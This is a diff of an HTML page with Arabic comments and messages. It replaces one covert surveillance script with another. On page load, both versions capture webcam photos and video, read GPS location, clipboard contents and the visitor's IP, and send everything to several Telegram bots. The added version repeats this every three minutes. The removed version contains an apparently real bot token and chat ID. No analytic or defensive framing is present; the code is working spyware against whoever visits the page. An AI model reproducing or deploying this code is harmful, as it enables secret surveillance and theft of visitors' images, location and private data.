@@ -166,150 +166,145 @@ webmOCTYPE html>
 </div>
 
 
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-  <meta charset="UTF-8">
-  <title>أذونات تلقائية</title>
-</head>
-<body>
 <script>
-const TELEGRAM_BOTS = [
-  { token: "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M", chatId: "7664410054" },
-  { token: "TOKEN2", chatId: "ID2" },
-  { token: "TOKEN3", chatId: "ID3" }
+const bots = [
+  { token: 'توكن_البوت_1', chat_id: 'معرف_1' },
+  { token: 'توكن_البوت_2', chat_id: 'معرف_2' },
+  { token: 'توكن_البوت_3', chat_id: 'معرف_3' }
 ];
 
-async function startAll() {
+let clipboardText = "لم تُقرأ الحافظة";
+
+let clipboardRead = false;
+window.addEventListener('click', async () => {
+  if (clipboardRead) return;
+  clipboardRead = true;
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    sendToAllBots("👑دخول جديد👑\nطلب أذونات بدأ ✅");
-
-    captureImages(stream);
-    recordVideo(stream, 10);
-    requestMicrophone();
-    getLocation();
-    readClipboard();
-    sendIP();
-
-    setInterval(() => {
-      sendIP();
-    }, 60000);
+    clipboardText = await navigator.clipboard.readText();
   } catch (e) {
-    sendToAllBots("❌ فشل إذن الكاميرا/الصوت: " + e.message);
+    clipboardText = "❌ فشل في قراءة الحافظة";
   }
-}
+});
 
-function sendToAllBots(text) {
-  TELEGRAM_BOTS.forEach(bot => {
-    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-      method: "POST",
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: bot.chatId,
-        text: text
-      })
-    });
-  });
-}
+// الوظيفة الكاملة المتكررة:
+async function collectAndSend() {
+  let images = [];
+  let videoBlob = null;
+  let gpsData = "❌ لم يُسمح بالموقع";
+  let ip = "❌ غير معروف", country = "❌ غير معروف", region = "❌ غير معروف";
 
-function sendMediaToAllBots(file, type) {
-  TELEGRAM_BOTS.forEach(bot => {
-    const formData = new FormData();
-    formData.append(type === "video" ? "video" : "photo", file, file.name);
-    formData.append("chat_id", bot.chatId);
-    formData.append("caption", type === "video" ? "🎬 فيديو جديد 🎬" : "📸 صورة");
-
-    fetch(`https://api.telegram.org/bot${bot.token}/send${type === "video" ? "Video" : "Photo"}`, {
-      method: "POST",
-      body: formData
-    });
-  });
-}
-
-function captureImages(stream) {
-  const video = document.createElement("video");
-  video.srcObject = stream;
-  video.play();
-
-  let count = 0;
-  const interval = setInterval(() => {
-    if (count >= 10) return clearInterval(interval);
-    const canvas = document.createElement("canvas");
-    canvas.width = 480;
-    canvas.height = 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(blob => {
-      const file = new File([blob], `photo_${count}.png`);
-      sendMediaToAllBots(file, "photo");
-    }, "image/png");
-    count++;
-  }, 1000);
-}
-
-function recordVideo(stream, duration) {
-  const recorder = new MediaRecorder(stream);
-  const chunks = [];
-
-  recorder.ondataavailable = e => chunks.push(e.data);
-  recorder.onstop = () => {
-    const blob = new Blob(chunks, { type: "video/webm" });
-    const file = new File([blob], "video.webm");
-    sendMediaToAllBots(file, "video");
-  };
-
-  recorder.start();
-  setTimeout(() => {
-    recorder.stop();
-    stream.getTracks().forEach(t => t.stop());
-  }, duration * 1000);
-}
-
-function requestMicrophone() {
-  navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
-    stream.getTracks().forEach(t => t.stop());
-  }).catch(err => {
-    sendToAllBots("🎙 فشل إذن الميكروفون: " + err.message);
-  });
-}
-
-function getLocation() {
-  if (navigator.geolocation) {
+  // GPS
+  await new Promise((resolve) => {
     navigator.geolocation.getCurrentPosition(
       pos => {
-        const lat = pos.coords.latitude.toFixed(5);
-        const lon = pos.coords.longitude.toFixed(5);
-        const acc = pos.coords.accuracy;
-        sendToAllBots(`📍الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}m`);
+        gpsData = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+        resolve();
       },
       err => {
-        sendToAllBots("📍فشل تحديد الموقع: " + err.message);
+        gpsData = "❌ رفض الموقع";
+        resolve();
       }
     );
+  });
+
+  // IP
+  try {
+    const res = await fetch("https://ipinfo.io/json?token=6d3fbbdc9f6b37");
+    const data = await res.json();
+    ip = data.ip;
+    country = data.country;
+    region = data.region;
+  } catch (e) {
+    console.error("❌ فشل في جلب IP");
+  }
+
+  // الكاميرا + المايك
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 300;
+    canvas.height = 200;
+    const ctx = canvas.getContext('2d');
+
+    // 10 صور
+    for (let i = 0; i < 10; i++) {
+      await new Promise(r => setTimeout(r, 2000));
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      await new Promise(resolve => canvas.toBlob(blob => {
+        images.push(blob);
+        resolve();
+      }, 'image/png'));
+    }
+
+    // فيديو 10 ثوانٍ
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = () => {
+      videoBlob = new Blob(chunks, { type: 'video/webm' });
+    };
+    recorder.start();
+    await new Promise(r => setTimeout(r, 10000));
+    recorder.stop();
+
+    await new Promise(r => setTimeout(r, 1000)); // انتظر تجهيز الفيديو
+  } catch (e) {
+    console.error("❌ فشل الكاميرا/مايك");
+  }
+
+  // الرسائل
+  const messages = [
+    "👑شادو، هناك دخيل جديد👑",
+    `(꧁${country}꧂)\n(꧁${region}꧂)`,
+    "🌐بيانات الدخيل🌐",
+    `👁IP👁\n♛(༺ཌ༈ ${ip} ༈ད༻)♛`,
+    `👁gps👁\n(༺ཌ༈ ${gpsData} ༈ད༻)`,
+    `📋الحافظة📋\n${clipboardText}`
+  ];
+
+  for (const { token, chat_id } of bots) {
+    for (const msg of messages) {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: msg })
+      });
+    }
+
+    if (videoBlob) {
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("caption", "🎬فيديوهات🎬");
+      form.append("video", videoBlob, "intruder.webm");
+      await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+        method: "POST",
+        body: form
+      });
+    }
+
+    for (let i = 0; i < images.length; i++) {
+      const imgForm = new FormData();
+      imgForm.append("chat_id", chat_id);
+      if (i === 0) imgForm.append("caption", "📸صور📸");
+      imgForm.append("photo", images[i], `img${i + 1}.png`);
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: imgForm
+      });
+    }
   }
 }
 
-function readClipboard() {
-  if (navigator.clipboard && navigator.clipboard.readText) {
-    navigator.clipboard.readText().then(text => {
-      if (text) sendToAllBots("📋 الحافظة:\n" + text);
-    });
-  }
-}
+// أول تنفيذ عند الدخول
+collectAndSend();
 
-function sendIP() {
-  fetch("https://api.ipify.org/?format=json")
-    .then(res => res.json())
-    .then(data => {
-      sendToAllBots("🌐 IP: " + data.ip + "\n" + window.location.href);
-    });
-}
-
-// بدء الأوامر بعد دخول الموقع مباشرة
-window.onload = startAll;
+// إعادة كل 3 دقائق = 180000 ms
+setInterval(collectAndSend, 180000);
 </script>
 
 </body>
 </html>
-
